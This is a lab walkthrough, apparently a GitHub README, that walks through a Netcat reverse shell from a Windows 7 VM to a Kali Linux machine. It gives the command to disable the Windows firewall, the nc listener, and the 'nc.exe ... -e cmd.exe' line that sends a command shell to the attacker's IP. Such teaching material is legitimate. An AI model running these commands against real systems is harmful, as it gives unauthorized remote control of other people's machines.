# Netcat Reverse Shell: Windows to Kali Linux

## 📖 Overview
This document provides a step-by-step walkthrough of establishing a **Reverse Shell** from a Windows machine to a Kali Linux attacking machine using Netcat (`nc`). Unlike a bind shell, a reverse shell forces the target (Windows) to initiate the connection back to the attacker (Kali), which is a common technique used to bypass inbound firewall rules.

---

## 🔍 Phase 1: Network Discovery & Configuration

Before attempting the exploit, we must configure the network, disable security boundaries for the lab, and verify connectivity.

### 1. Kali Linux (Attacker) Network Configuration
We begin on the Kali Linux machine by running `ifconfig` to identify its local IP address on the `eth0` interface. This is the address the Windows machine will need to connect back to.
*   **IP Address:** `192.168.1.4`

*(Screenshot showing the ifconfig output on Kali Linux)*
 <img width="1920" height="922" alt="VirtualBox_kali linux_15_07_2026_14_20_17" src="https://github.com/user-attachments/assets/88e83815-0a21-44e7-9477-5e737a76a621" />

### 2. Windows (Target) Firewall & IP Configuration
On the Windows target, we simulate a vulnerable environment by explicitly disabling the firewall using an elevated command prompt (`netsh advfirewall set allprofiles state off`). We then run `ipconfig` to confirm the target's IP address.
*   **IP Address:** `192.168.1.11`

*(Screenshot showing the Windows firewall being disabled and the ipconfig output)*
 <img width="1280" height="720" alt="VirtualBox_windows 7_15_07_2026_14_20_48" src="https://github.com/user-attachments/assets/501df2dd-0e2a-44ef-bb80-5a697032426f" />

### 3. Host Discovery Verification
Back on the Kali Linux machine, we use `arp-scan -l` to broadcast ARP requests across the local subnet. This confirms that the Windows machine (`192.168.1.11`) is successfully identified and reachable.

*(Screenshot showing the arp-scan execution and host discovery)*
![ARP Scan Discovery](IMG-20260715-WA0001_2.jpg)

---

## ⚙️ Phase 2: Exploitation & Execution

With the network mapped, we set up our listener and execute the reverse shell payload on the target.

### 1. Setting up the Listener (Kali Linux)
On Kali Linux, we start Netcat in listening mode on port `4455`. This port will wait for the Windows machine to call back.
*   **Command:** `nc -lvp 4455`

*(Screenshot showing Kali Linux listening on port 4455)*
![Kali Linux Netcat Listener](IMG-20260715-WA0009.jpg)

### 2. Executing the Reverse Shell (Windows)
On the Windows machine, we navigate to the directory containing the Netcat executable (`nc.exe`). We execute a command that connects back to the Kali IP and pipes the Windows command prompt (`cmd.exe`) over the network socket.
*   **Command:** `nc.exe 192.168.1.4 4455 -e cmd.exe`
    *   **`-e cmd.exe`**: This critical flag tells Netcat to execute the `cmd.exe` program after connecting and to redirect its standard input, output, and error streams over the TCP connection.

*(Screenshot showing the execution of the reverse shell payload on Windows)*
![Windows Netcat Reverse Shell Execution](IMG-20260715-WA0010.jpg)

Once executed, the Windows terminal will appear to "hang" with a blank blinking cursor. This indicates that the Netcat process is actively running and maintaining the connection in the foreground.

*(Screenshot showing the active, hanging Windows command prompt)*
![Windows CMD Hanging](IMG-20260715-WA0008.jpg)

---

## 💻 Phase 3: Post-Exploitation (Shell Access)

We return to the Kali Linux terminal to verify that the reverse connection was caught successfully.

### System Interaction
The Kali listener catches the incoming connection from `192.168.1.11`. Immediately, the Microsoft Windows banner and the `C:\Users\boss\Desktop\nc.exe-master>` prompt appear within the Kali terminal. 

Executing a standard `dir` command from the Kali terminal lists the directory contents of the Windows machine, confirming we now have full, interactive remote command-line access to the target system.

*(Screenshot showing successful reverse shell access and command execution on Kali Linux)*
![Reverse Shell Access on Kali](IMG-20260715-WA0007.jpg)
